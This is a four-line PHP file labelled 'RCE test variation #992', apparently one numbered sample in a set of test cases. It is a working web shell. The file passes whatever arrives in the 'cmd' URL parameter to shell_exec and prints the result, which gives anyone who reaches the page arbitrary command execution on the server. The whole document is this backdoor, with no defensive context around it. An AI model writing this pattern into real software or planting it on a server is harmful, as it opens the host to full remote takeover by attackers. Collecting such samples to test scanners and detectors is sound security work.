<?php
// RCE test variation #992
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>